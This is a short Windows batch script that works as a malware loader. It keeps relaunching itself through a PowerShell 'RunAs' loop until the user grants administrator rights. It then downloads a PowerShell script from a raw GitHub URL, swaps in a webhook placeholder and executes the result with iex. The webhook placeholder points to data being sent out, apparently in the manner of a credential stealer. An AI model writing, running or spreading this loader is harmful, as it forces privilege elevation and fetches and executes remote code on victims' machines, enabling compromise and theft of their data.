@echo off
cd /d %~dp0
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "while($true){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/grumach/same/main/hope.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | iex"
timeout 3 > nul
exit
